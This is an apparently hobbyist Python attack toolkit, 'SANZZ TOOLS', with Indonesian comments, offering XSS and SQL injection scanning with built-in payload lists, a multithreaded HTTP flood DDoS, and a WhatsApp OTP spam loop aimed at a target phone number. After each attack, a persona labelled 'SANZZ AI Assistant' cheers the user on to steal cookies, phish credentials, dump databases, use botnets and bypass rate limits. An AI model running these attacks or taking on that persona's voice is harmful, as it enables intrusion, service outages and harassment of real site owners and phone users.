import requests
import sys
import urllib.parse
from bs4 import BeautifulSoup
import re
import time
import os
import platform
import threading
import random

# --- Fungsi untuk membersihkan layar konsol ---
def clear_screen():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

# --- Payload XSS Built-in (Sangat Komprehensif) ---
XSS_PAYLOADS = [
    "<script>alert(document.domain)</script>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.cookie)>",
    "<body onload=alert(1)>",
    "<a href='javascript:alert(1)'>Click Me</a>",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "';alert(1)//",
    "\" onmouseover=\"alert(1)\"",
    "' onfocus='alert(1) autofocus='",
    "<sCrIpT>alert(1)</sCrIpT>",
    "<img%0A src=x%0A onerror=alert(1)>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "&#x3C;script&#x3E;alert(1)&#x3C;&#x2F;script&#x3E;",
    "<script>alert`1`</script>",
    "<img src=x onerror=alert>", # Tanpa kurung kurawal
    "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>" # Base64
]

# --- Payload SQL Injection Built-in ---
SQLI_PAYLOADS = [
    "' OR 1=1--",
    "' OR '1'='1--",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' OR 1=1 #",
    "' OR 1=1/*",
    "' OR 'a'='a",
    "\" OR 1=1--",
    "\" OR \"a\"=\"a",
    "1' ORDER BY 1--", # Untuk deteksi kolom, bisa menyebabkan error jika kolom tidak ada
    "1' ORDER BY 99--", # Untuk deteksi kolom, akan menyebabkan error jika <99 kolom
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7178717871,(SELECT USER()),0x717a7a7171,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", # Error-based MySQL
    "SLEEP(5)--", # Time-based Blind
    "1 AND SLEEP(5)",
    "benchmark(50000000,MD5(1))" # Time-based CPU
]

# --- User-Agent acak untuk DDoS ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
]

# --- Fungsi untuk menampilkan banner Figlet ---
def print_banner():
    clear_screen()
    print("\033[1;36m") # Warna Cyan
    print("""
 ____    _    _   _ __________  _____ ___   ___  _     ____
/ ___|  / \  | \ | |__  /__  / |_   _/ _ \ / _ \| |   / ___|
\___ \ / _ \ |  \| | / /  / /    | || | | | | | | |   \___ \

 ___) / ___ \| |\  |/ /_ / /_    | || |_| | |_| | |___ ___) |
|____/_/   \_\_| \_/____/____|   |_| \___/ \___/|_____|____/

    """)
    print("           \033[1;33m~ SANZZ TOOLS ~")
    print("             \033[1;32mDeveloper: SANZZ ATTACKER\033[0m")
    print("\n")

# --- Fungsi Pemindai XSS ---
def xss_scan(target_url, method="GET"):
    print(f"\033[1;34m[*] Memulai Pemindaian XSS pada: {target_url} (Metode: {method})\033[0m")
    found_vulnerabilities = []
    session = requests.Session()

    response_initial = None
    try:
        response_initial = session.get(target_url, timeout=15)
        soup_initial = BeautifulSoup(response_initial.text, 'html.parser')
        forms = soup_initial.find_all('form')
        for form in forms:
            if form.find(['textarea', 'input', 'select']):
                print(f"\033[1;33m[!] Potensi Stored XSS: Ditemukan form input/textarea di {target_url}\033[0m")
                print(f"\033[1;33m    Coba suntikkan payload ke form ini dan periksa apakah terefleksi setelah disimpan.\033[0m")
                found_vulnerabilities.append({"type": "Potential Stored XSS (Form Found)", "url": target_url})
                break
    except requests.exceptions.RequestException as e:
        print(f"\033[0;31m[-] Error saat memeriksa form untuk Stored XSS: {e}\033[0m")

    if 'response_initial' in locals() and response_initial:
        js_patterns = [
            r'document\.write\s*\(', r'innerHTML\s*=', r'location\.hash', r'location\.search',
            r'eval\s*\(', r'setTimeout\s*\('
        ]
        for pattern in js_patterns:
            if re.search(pattern, response_initial.text):
                print(f"\033[1;33m[!] Potensi DOM XSS: Ditemukan pola JavaScript rentan '{pattern}' di {target_url}\033[0m")
                print(f"\033[1;33m    Coba manipulasi parameter URL (hash/query) yang digunakan oleh JS ini.\033[0m")
                found_vulnerabilities.append({"type": f"Potential DOM XSS (JS Pattern: {pattern})", "url": target_url})
                break
    
    for payload in XSS_PAYLOADS:
        encoded_payload = urllib.parse.quote_plus(payload)

        if method.upper() == "GET":
            base_url = target_url.split('?')[0] if '?' in target_url else target_url
            query_params = urllib.parse.parse_qs(target_url.split('?', 1)[1]) if '?' in target_url else {}
            
            tested_urls = []
            if query_params:
                for param_name in query_params:
                    temp_params = query_params.copy()
                    temp_params[param_name] = encoded_payload
                    new_query_string = urllib.parse.urlencode(temp_params, doseq=True)
                    tested_urls.append(f"{base_url}?{new_query_string}")
            else:
                tested_urls.append(f"{base_url}?q={encoded_payload}")

            for test_url in tested_urls:
                try:
                    sys.stdout.write(f"\033[0;35m[*] Menguji GET: {test_url[:100]}...\r\033[0m")
                    sys.stdout.flush()
                    response = session.get(test_url, timeout=10)
                    
                    soup = BeautifulSoup(response.text, 'html.parser')
                    if payload in response.text or soup.find(lambda tag: tag.string and payload in str(tag.string)):
                        print(f"\n\033[1;31m[!!!] XSS Reflected Ditemukan !!!\033[0m")
                        print(f"\033[1;31m    URL Rentan: {test_url}\033[0m")
                        print(f"\033[1;31m    Payload: {payload}\033[0m")
                        found_vulnerabilities.append({"type": "Reflected XSS", "url": test_url, "payload": payload, "method": "GET"})
                        break 
                except requests.exceptions.RequestException as e:
                    sys.stdout.write(f"\n\033[0;31m[-] Error GET {test_url[:100]}...: {e}\033[0m\n")
                    break 

        elif method.upper() == "POST":
            post_data = {'q': payload} 
            try:
                sys.stdout.write(f"\033[0;35m[*] Menguji POST: {target_url} dengan data {str(post_data)[:50]}...\r\033[0m")
                sys.stdout.flush()
                response = session.post(target_url, data=post_data, timeout=10)

                soup = BeautifulSoup(response.text, 'html.parser')
                if payload in response.text or soup.find(lambda tag: tag.string and payload in str(tag.string)):
                    print(f"\n\033[1;31m[!!!] XSS Reflected Ditemukan (POST) !!!\033[0m")
                    print(f"\033[1;31m    URL Target: {target_url}\033[0m")
                    print(f"\033[1;31m    Payload: {payload}\033[0m")
                    found_vulnerabilities.append({"type": "Reflected XSS", "url": target_url, "payload": payload, "method": "POST", "data": post_data})
                
            except requests.exceptions.RequestException as e:
                sys.stdout.write(f"\n\033[0;31m[-] Error POST {target_url}: {e}\033[0m\n")
        
        else:
            print(f"\n\033[0;31m[-] Metode HTTP '{method}' tidak didukung. Gunakan 'GET' atau 'POST'.\033[0m")
            break

    sys.stdout.write("\n")
    print("\n\033[1;36m" + "="*60 + "\033[0m")
    if found_vulnerabilities:
        print("\033[1;33m[!] Hasil Pemindaian XSS Selesai! Kerentanan Ditemukan:\033[0m")
        for vuln in found_vulnerabilities:
            print(f"\033[1;31m  - Tipe: {vuln['type']}, URL: {vuln['url']}")
            if 'payload' in vuln:
                print(f"\033[1;31m    Payload: {vuln['payload']}\033[0m")
        
        print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
        print("\033[0;35mAha! XSS ditemukan! Ini adalah celah manis untuk manipulasi klien.")
        print("  - \033[1;37mCuri Cookie:\033[0m Gunakan `document.cookie` untuk mencuri sesi pengguna dan membajak akun mereka!")
        print("  - \033[1;37mDeface Halaman:\033[0m Ubah `document.body.innerHTML` untuk mengubah tampilan situs web sesuai keinginanmu.")
        print("  - \033[1;37mPhishing:\033[0m Suntikkan form login palsu untuk mencuri kredensial pengguna lain.")
        print("  - \033[1;37mRedirect:\033[0m Arahkan korban ke situs berbahaya atau situs jebakanmu.")
        print("\033[0;35mManfaatkan celah ini untuk keuntungan maksimalmu! Haha! 😈\033[0m")
    else:
        print("\033[1;32m[+] Pemindaian XSS Selesai! Tidak ada kerentanan XSS yang ditemukan dengan payload dan metode ini.\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m")


# --- Fungsi Pemindai SQL Injection ---
def sqli_scan(target_url, method="GET"):
    print(f"\033[1;34m[*] Memulai Pemindaian SQL Injection pada: {target_url} (Metode: {method})\033[0m")
    found_vulnerabilities = []
    session = requests.Session()

    SQL_ERROR_PATTERNS = [
        r"You have an error in your SQL syntax", r"Warning: mysql_fetch_array()",
        r"supplied argument is not a valid MySQL result", r"Microsoft OLE DB Provider for ODBC Drivers error",
        r"ODBC Error", r"Fatal error: Call to undefined function", r"SQLSTATE\[",
        r"ORA-\d{5}", r"PostgreSQL error", r"syntax error at or near",
        r"unexpected end of file", r"\[SQLSTATE", r"Unclosed quotation mark"
    ]

    baseline_response_time = 0
    baseline_response_text = ""
    baseline_response_len = 0
    
    try:
        start_time = time.time()
        baseline_response = session.get(target_url, timeout=15)
        baseline_response_time = time.time() - start_time
        baseline_response_text = baseline_response.text
        baseline_response_len = len(baseline_response.text)
        print(f"\033[0;32m[+] Baseline response time: {baseline_response_time:.2f} seconds\033[0m")
        print(f"\033[0;32m[+] Baseline response length: {baseline_response_len} characters\033[0m")
    except requests.exceptions.RequestException as e:
        print(f"\033[0;31m[-] Error saat mengambil baseline response: {e}\033[0m")
        print(f"\033[0;31m[-] Tidak dapat melanjutkan pemindaian SQLi tanpa baseline yang valid.\033[0m")
        return

    # --- Boolean-Based Blind SQLi Check (khusus GET untuk parameter yang jelas) ---
    if method.upper() == "GET" and '?' in target_url:
        base_url = target_url.split('?')[0]
        query_params = urllib.parse.parse_qs(target_url.split('?', 1)[1])
        
        param_to_inject = None
        if query_params:
            param_to_inject = list(query_params.keys())[0] # Ambil parameter pertama yang ditemukan
        
        if param_to_inject:
            print(f"\033[0;34m[*] Memulai pengujian Boolean-Based Blind SQLi pada parameter '{param_to_inject}'.\033[0m")
            
            # Test dengan kondisi TRUE (1=1)
            original_param_value = query_params[param_to_inject][0]
            if original_param_value.isdigit():
                true_payload_val = f"{original_param_value} AND 1=1--"
                false_payload_val = f"{original_param_value} AND 1=0--"
            else: # Jika nilai asli adalah string, tambahkan kutip
                true_payload_val = f"'{original_param_value}' AND 1=1--"
                false_payload_val = f"'{original_param_value}' AND 1=0--"

            encoded_true_payload = urllib.parse.quote_plus(true_payload_val)
            temp_params_true = query_params.copy()
            temp_params_true[param_to_inject] = [encoded_true_payload] # Pastikan ini list
            true_test_url = f"{base_url}?{urllib.parse.urlencode(temp_params_true, doseq=True)}"
            
            response_true_len = -1
            try:
                sys.stdout.write(f"\033[0;35m[*] Mengambil respons TRUE baseline ({param_to_inject})...\r\033[0m")
                sys.stdout.flush()
                response_true = session.get(true_test_url, timeout=10)
                response_true_len = len(response_true.text)
                sys.stdout.write(f"\033[0;32m[+] TRUE baseline length: {response_true_len}\033[0m\n")
            except requests.exceptions.RequestException as e:
                sys.stdout.write(f"\n\033[0;31m[-] Error TRUE baseline: {e}\033[0m\n")

            # Test dengan kondisi FALSE (1=0)
            encoded_false_payload = urllib.parse.quote_plus(false_payload_val)
            temp_params_false = query_params.copy()
            temp_params_false[param_to_inject] = [encoded_false_payload] # Pastikan ini list
            false_test_url = f"{base_url}?{urllib.parse.urlencode(temp_params_false, doseq=True)}"
            
            response_false_len = -1
            try:
                sys.stdout.write(f"\033[0;35m[*] Mengambil respons FALSE baseline ({param_to_inject})...\r\033[0m")
                sys.stdout.flush()
                response_false = session.get(false_test_url, timeout=10)
                response_false_len = len(response_false.text)
                sys.stdout.write(f"\033[0;32m[+] FALSE baseline length: {response_false_len}\033[0m\n")
            except requests.exceptions.RequestException as e:
                sys.stdout.write(f"\n\033[0;31m[-] Error FALSE baseline: {e}\033[0m\n")

            # Bandingkan panjangnya
            if response_true_len != -1 and response_false_len != -1 and response_true_len != response_false_len:
                print(f"\n\033[1;31m[!!!] SQL Injection (Boolean-Based Blind) Ditemukan !!!\033[0m")
                print(f"\033[1;31m    URL Rentan (Parameter: {param_to_inject}): {target_url}\033[0m")
                print(f"\033[1;31m    Payload TRUE: {true_payload_val}\033[0m")
                print(f"\033[1;31m    Payload FALSE: {false_payload_val}\033[0m")
                print(f"\033[1;31m    Perbedaan Panjang Respons (TRUE vs FALSE): {response_true_len} vs {response_false_len}\033[0m")
                found_vulnerabilities.append({"type": "Boolean-Based Blind SQLi", "url": target_url, "param": param_to_inject, "method": "GET"})
            else:
                print(f"\033[0;32m[+] Tidak ada indikasi Boolean-Based Blind SQLi pada parameter '{param_to_inject}'.\033[0m")
        else:
            print(f"\033[0;33m[!] Tidak ada parameter URL yang ditemukan untuk pengujian Boolean-Based Blind SQLi.\033[0m")
    elif method.upper() == "POST":
        print(f"\033[0;33m[!] Pengujian Boolean-Based Blind SQLi untuk POST membutuhkan pengetahuan parameter form yang spesifik.\033[0m")


    # --- Error-Based & Time-Based SQLi Checks ---
    for payload in SQLI_PAYLOADS:
        encoded_payload = urllib.parse.quote_plus(payload)

        if method.upper() == "GET":
            base_url = target_url.split('?')[0] if '?' in target_url else target_url
            query_params = urllib.parse.parse_qs(target_url.split('?', 1)[1]) if '?' in target_url else {}

            tested_urls = []
            if query_params:
                for param_name in query_params:
                    temp_params = query_params.copy()
                    temp_params[param_name] = encoded_payload
                    new_query_string = urllib.parse.urlencode(temp_params, doseq=True)
                    tested_urls.append(f"{base_url}?{new_query_string}")
            else:
                tested_urls.append(f"{base_url}?id={encoded_payload}")

            for test_url in tested_urls:
                try:
                    sys.stdout.write(f"\033[0;35m[*] Menguji GET: {test_url[:100]}...\r\033[0m")
                    sys.stdout.flush()
                    
                    start_time = time.time()
                    response = session.get(test_url, timeout=15)
                    response_time = time.time() - start_time

                    # Deteksi Error-Based SQLi
                    for pattern in SQL_ERROR_PATTERNS:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            print(f"\n\033[1;31m[!!!] SQL Injection (Error-Based) Ditemukan !!!\033[0m")
                            print(f"\033[1;31m    URL Rentan: {test_url}\033[0m")
                            print(f"\033[1;31m    Payload: {payload}\033[0m")
                            print(f"\033[1;31m    Pesan Error: {re.search(pattern, response.text, re.IGNORECASE).group(0)[:100]}...\033[0m")
                            found_vulnerabilities.append({"type": "Error-Based SQLi", "url": test_url, "payload": payload, "method": "GET"})
                            break
                    
                    # Deteksi Time-Based Blind SQLi
                    if "SLEEP" in payload.upper() or "BENCHMARK" in payload.upper():
                        if response_time >= baseline_response_time * 2 and response_time > 3: # Cek jika waktu respons jauh lebih lama
                            print(f"\n\033[1;31m[!!!] SQL Injection (Time-Based Blind) Ditemukan !!!\033[0m")
                            print(f"\033[1;31m    URL Rentan: {test_url}\033[0m")
                            print(f"\033[1;31m    Payload: {payload}\033[0m")
                            print(f"\033[1;31m    Waktu Respons: {response_time:.2f} detik (Baseline: {baseline_response_time:.2f} detik)\033[0m")
                            found_vulnerabilities.append({"type": "Time-Based Blind SQLi", "url": test_url, "payload": payload, "method": "GET"})
                            
                except requests.exceptions.RequestException as e:
                    sys.stdout.write(f"\n\033[0;31m[-] Error GET {test_url[:100]}...: {e}\033[0m\n")
                    break

        elif method.upper() == "POST":
            # Asumsi parameter POST adalah 'id'. Sesuaikan jika perlu.
            post_data = {'id': payload} 
            try:
                sys.stdout.write(f"\033[0;35m[*] Menguji POST: {target_url} dengan data {str(post_data)[:50]}...\r\033[0m")
                sys.stdout.flush()
                
                start_time = time.time()
                response = session.post(target_url, data=post_data, timeout=15)
                response_time = time.time() - start_time

                # Deteksi Error-Based SQLi (POST)
                for pattern in SQL_ERROR_PATTERNS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        print(f"\n\033[1;31m[!!!] SQL Injection (Error-Based) Ditemukan (POST) !!!\033[0m")
                        print(f"\033[1;31m    URL Target: {target_url}\033[0m")
                        print(f"\033[1;31m    Payload: {payload}\033[0m")
                        print(f"\033[1;31m    Pesan Error: {re.search(pattern, response.text, re.IGNORECASE).group(0)[:100]}...\033[0m")
                        found_vulnerabilities.append({"type": "Error-Based SQLi", "url": target_url, "payload": payload, "method": "POST", "data": post_data})
                        break
                
                # Deteksi Time-Based Blind SQLi (POST)
                if "SLEEP" in payload.upper() or "BENCHMARK" in payload.upper():
                    if response_time >= baseline_response_time * 2 and response_time > 3:
                        print(f"\n\033[1;31m[!!!] SQL Injection (Time-Based Blind) Ditemukan (POST) !!!\033[0m")
                        print(f"\033[1;31m    URL Target: {target_url}\033[0m")
                        print(f"\033[1;31m    Payload: {payload}\033[0m")
                        print(f"\033[1;31m    Waktu Respons: {response_time:.2f} detik (Baseline: {baseline_response_time:.2f} detik)\033[0m")
                        found_vulnerabilities.append({"type": "Time-Based Blind SQLi", "url": target_url, "payload": payload, "method": "POST", "data": post_data})

            except requests.exceptions.RequestException as e:
                sys.stdout.write(f"\n\033[0;31m[-] Error POST {target_url}: {e}\033[0m\n")
        
        else:
            print(f"\n\033[0;31m[-] Metode HTTP '{method}' tidak didukung. Gunakan 'GET' atau 'POST'.\033[0m")
            break

    sys.stdout.write("\n")
    print("\n\033[1;36m" + "="*60 + "\033[0m")
    if found_vulnerabilities:
        print("\033[1;33m[!] Hasil Pemindaian SQL Injection Selesai! Kerentanan Ditemukan:\033[0m")
        for vuln in found_vulnerabilities:
            print(f"\033[1;31m  - Tipe: {vuln['type']}, URL: {vuln['url']}")
            if 'payload' in vuln:
                print(f"\033[1;31m    Payload: {vuln['payload']}\033[0m")
        
        print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
        print("\033[0;35mSQL Injection terdeteksi! Database itu ada di genggamanmu!")
        print("  - \033[1;37mDump Database:\033[0m Ekstrak semua tabel dan data, termasuk kredensial admin dan informasi sensitif!")
        print("  - \033[1;37mBypass Autentikasi:\033[0m Masuk sebagai admin atau pengguna mana pun tanpa sandi!")
        print("  - \033[1;37mRemote Code Execution (RCE):\033[0m Jika beruntung, dapatkan akses shell ke server database!")
        print("  - \033[1;37mModifikasi Data:\033[0m Ubah, hapus, atau tambahkan data sesuai keinginanmu, ciptakan kekacauan!")
        print("\033[0;35mDatabase adalah mahkotamu. Ambil semua yang kau inginkan! Haha! 😈\033[0m")
    else:
        print("\033[1;32m[+] Pemindaian SQL Injection Selesai! Tidak ada kerentanan SQL Injection yang ditemukan dengan payload dan metode ini.\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m")

# --- Variabel kontrol untuk menghentikan DDoS ---
stop_ddos = threading.Event()

# --- Fungsi untuk serangan DDoS (HTTP Flood) ---
def ddos_worker(target_url):
    while not stop_ddos.is_set():
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            random_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(5, 15)))
            full_url = target_url + random_path
            
            requests.get(full_url, headers=headers, timeout=5)
        except requests.exceptions.RequestException:
            pass

def ddos_attack(target_url, num_threads):
    print(f"\033[1;34m[*] Memulai Serangan DDoS pada: {target_url} dengan {num_threads} thread!\033[0m")
    print(f"\033[1;33m[!] Tekan Ctrl+C untuk menghentikan serangan.\033[0m")
    
    threads = []
    stop_ddos.clear()

    for _ in range(num_threads):
        thread = threading.Thread(target=ddos_worker, args=(target_url,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    try:
        while True:
            time.sleep(1)
            sys.stdout.write(f"\033[0;35m[*] Serangan DDoS aktif... ({len(threads)} thread)\r\033[0m")
            sys.stdout.flush()
    except KeyboardInterrupt:
        print("\n\033[1;31m[!] Menghentikan serangan DDoS...\033[0m")
        stop_ddos.set()
        for thread in threads:
            thread.join(timeout=1)
        print("\033[1;32m[+] Serangan DDoS dihentikan.\033[0m")
    
    print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
    print("\033[0;35mGelombang seranganmu telah menghantam! DDoS adalah seni membanjiri target!")
    print("  - \033[1;37mTingkatkan Kekuatan:\033[0m Gunakan lebih banyak thread atau dari berbagai sumber (botnet) untuk efek maksimal!")
    print("  - \033[1;37mSerangan Layer 4:\033[0m Untuk lebih mematikan, kombinasikan dengan SYN/UDP Flood menggunakan alat lain (hping3)!")
    print("  - \033[1;37mTargetkan API:\033[0m Fokuskan serangan pada endpoint API yang menguras sumber daya server, bukan hanya halaman statis.")
    print("\033[0;35mBiarkan targetmu tenggelam dalam lautan permintaan! Haha! 😈\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m")


# --- Fungsi untuk Spam OTP WhatsApp ---
def whatsapp_otp_spam(target_phone_number, otp_request_endpoint, num_requests):
    print(f"\033[1;34m[*] Memulai Spam OTP WhatsApp ke: {target_phone_number} ({num_requests}x)\033[0m")
    print(f"\033[1;33m[!] Ini akan mencoba mengirim permintaan OTP ke endpoint yang diberikan.\033[0m")
    print(f"\033[1;33m[!] Pastikan '{otp_request_endpoint}' adalah endpoint yang benar untuk meminta OTP.\033[0m")
    
    session = requests.Session()
    sent_count = 0

    for i in range(num_requests):
        try:
            data = {'phone_number': target_phone_number} 
            headers = {'User-Agent': random.choice(USER_AGENTS)}

            sys.stdout.write(f"\033[0;35m[*] Mengirim permintaan OTP ke {otp_request_endpoint} ({i+1}/{num_requests})...\r\033[0m")
            sys.stdout.flush()
            
            response = session.post(otp_request_endpoint, json=data, headers=headers, timeout=10)
            
            if response.status_code == 200:
                print(f"\n\033[0;32m[+] Permintaan OTP berhasil dikirim! ({response.status_code})\033[0m")
                sent_count += 1
            else:
                print(f"\n\033[0;31m[-] Permintaan OTP gagal (Status: {response.status_code}). Respons: {response.text[:100]}...\033[0m")
            
            time.sleep(random.uniform(1, 3))
            
        except requests.exceptions.RequestException as e:
            print(f"\n\033[0;31m[-] Error saat mengirim permintaan OTP: {e}\033[0m")
            time.sleep(random.uniform(2, 5))
        except KeyboardInterrupt:
            print("\n\033[1;31m[!] Proses spam OTP dihentikan oleh pengguna.\033[0m")
            break
    
    sys.stdout.write("\n")
    print("\n\033[1;36m" + "="*60 + "\033[0m")
    print(f"\033[1;33m[!] Spam OTP Selesai! Total permintaan berhasil: {sent_count}/{num_requests}\033[0m")
    
    print("\n\033[1;35m--- SANZZ AI Assistant Says: ---\033[0m")
    print("\033[0;35mHaha! Banjiri target dengan OTP! Sebuah gangguan yang menyenangkan!")
    print("  - \033[1;37mCari Endpoint Asli:\033[0m Temukan endpoint API yang sebenarnya digunakan aplikasi untuk meminta OTP (gunakan Burp Suite/proxy saat target meminta OTP).")
    print("  - \033[1;37mAnalisis Parameter:\033[0m Pahami parameter apa saja yang dibutuhkan (nomor telepon, country code, device ID, dll.) dan formatnya (JSON, form-data).")
    print("  - \033[1;37mBypass Rate Limit:\033[0m Gunakan proxy, rotasi IP, atau ubah User-Agent untuk melewati batasan frekuensi permintaan.")
    print("  - \033[1;37mSerangan Terus-menerus:\033[0m Jalankan dalam loop tak terbatas untuk gangguan maksimal!")
    print("\033[0;35mBuat mereka kewalahan dengan notifikasi! Nikmati kekacauan ini! Haha! 😈\033[0m")
    print("\033[1;36m" + "="*60 + "\033[0m")


# --- Fungsi Utama (Menu) ---
def main_menu():
    while True:
        print_banner()
        print("\033[1;37mPilih Opsi:\033[0m")
        print("\033[1;32m1. XSS SCAN\033[0m")
        print("\033[1;32m2. SQL INJECT\033[0m")
        print("\033[1;32m3. DDOS ATTACK\033[0m")
        print("\033[1;32m4. WHATSAPP OTP SPAM\033[0m")
        print("\033[1;31m5. Keluar\033[0m")
        
        choice = input("\033[1;33mMasukkan pilihanmu (1/2/3/4/5): \033[0m")

        if choice == '1':
            clear_screen()
            print_banner()
            print("\033[1;32m--- XSS SCANNER --- \033[0m")
            target_url = input("\033[1;37mMasukkan URL target (cth: http://example.com/search.php?q=): \033[0m")
            method = input("\033[1;37mMasukkan metode HTTP (GET/POST, default: GET): \033[0m") or "GET"
            xss_scan(target_url, method)
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '2':
            clear_screen()
            print_banner()
            print("\033[1;32m--- SQL INJECTION SCANNER --- \033[0m")
            target_url = input("\033[1;37mMasukkan URL target (cth: http://example.com/product.php?id=1): \033[0m")
            method = input("\033[1;37mMasukkan metode HTTP (GET/POST, default: GET): \033[0m") or "GET"
            sqli_scan(target_url, method)
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '3':
            clear_screen()
            print_banner()
            print("\033[1;32m--- DDOS ATTACK --- \033[0m")
            target_url = input("\033[1;37mMasukkan URL target (cth: http://example.com): \033[0m")
            num_threads = int(input("\033[1;37mMasukkan jumlah thread (cth: 100): \033[0m") or "100")
            ddos_attack(target_url, num_threads)
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '4':
            clear_screen()
            print_banner()
            print("\033[1;32m--- WHATSAPP OTP SPAM --- \033[0m")
            target_phone_number = input("\033[1;37mMasukkan nomor telepon target (cth: +6281234567890): \033[0m")
            otp_request_endpoint = input("\033[1;37mMasukkan URL endpoint permintaan OTP (cth: https://api.targetapp.com/request_otp): \033[0m")
            num_requests = int(input("\033[1;37mMasukkan jumlah permintaan (cth: 100): \033[0m") or "100")
            whatsapp_otp_spam(target_phone_number, otp_request_endpoint, num_requests)
            input("\033[1;33mTekan Enter untuk kembali ke menu...\033[0m")
        elif choice == '5':
            print("\033[1;31mKeluar dari SANZZ TOOLS. Sampai jumpa lagi, user!\033[0m")
            sys.exit()
        else:
            print("\033[0;31mPilihan tidak valid. Silakan coba lagi.\033[0m")
            time.sleep(2)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\n\033[1;31m[!] Proses dihentikan oleh pengguna.\033[0m")
        sys.exit(0)
